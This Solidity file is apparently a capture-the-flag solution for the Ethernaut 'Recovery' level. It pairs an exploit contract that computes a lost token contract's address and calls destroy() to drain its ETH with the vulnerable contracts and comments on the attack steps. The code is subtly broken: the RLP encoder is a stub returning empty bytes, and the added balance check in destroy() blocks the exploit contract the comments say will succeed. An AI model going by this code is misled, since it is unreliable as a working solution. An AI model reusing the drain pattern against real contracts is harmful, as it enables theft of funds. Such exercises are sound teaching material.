// Ethernaut Challenge #17: Recovery
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
 * RECOVERY CHALLENGE
 * 
 * Goal: Recover the 0.001 ETH sent to the lost SimpleToken contract.
 * 
 * THE VULNERABILITY:
 * Contract addresses are DETERMINISTIC. They're calculated from:
 * - deployer address
 * - deployer nonce (or salt for CREATE2)
 * 
 * When Recovery contract deploys SimpleToken, the address is:
 * address = keccak256(rlp.encode([deployer, nonce]))[12:]
 * 
 * We can calculate this address and interact with the lost contract!
 * 
 * ALTERNATELY:
 * The token was deployed, had ETH sent to it, but we don't know
 * the address. We need to either:
 * 1. Calculate it (knowing deployer + nonce)
 * 2. Find it in transaction logs
 * 3. Brute force possible nonces
 */

contract RecoveryExploit {
    // Calculate the lost contract address
    function findLostContract(address deployer, uint nonce) public pure returns (address) {
        // RLP encoding for address + nonce
        // For nonce < 128, RLP is: 0x80 + length, bytes
        // Actually for simple cases, we can use this formula:
        
        bytes memory rlpEncoded = rlpEncode(deployer, nonce);
        bytes32 hash = keccak256(rlpEncoded);
        return address(uint160(uint256(hash)));
    }
    
    function rlpEncode(address addr, uint nonce) internal pure returns (bytes memory) {
        // Simplified RLP encode for address (20 bytes) + nonce
        bytes memory encoded = new bytes(21 + (nonce < 0x80 ? 1 : 2));
        // ... encoding logic
        // In practice, use a library or calculate off-chain
        return encoded;
    }
    
    // The actual attack: call destroy() on the lost token
    function recover(address tokenAddress) external {
        SimpleToken(tokenAddress).destroy(payable(msg.sender));
    }
}

contract Recovery {
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint) public balances;
    
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }
    
    receive() external payable {}
    
    function destroy(address payable _to) external {
        require(balances[msg.sender] > 0); // Must have tokens
        selfdestruct(_to); // Sends all ETH to _to
    }
}

/*
 * ATTACK STEPS:
 * 
 * 1. Find the lost contract address:
 *    - Check transaction logs for contract creation
 *    - Or calculate: address = keccak256(rlp[deployer, nonce])[12:]
 *    - Nonce starts at 1 for first contract deployment
 * 
 * 2. Call destroy(yourAddress) on the lost contract:
 *    - Must have token balance (creator does)
 *    - Sends all ETH (0.001) to specified address
 * 
 * LESSON:
 * - Contract addresses are predictable
 * - Lost contracts aren't really "lost" - they're findable
 * - Anyone can interact with a contract if they know the address
 * - selfdestruct sends ETH regardless of permissions
 * 
 * In the real world: Search block explorers, event logs, or
 * calculate from known parameters.
 */
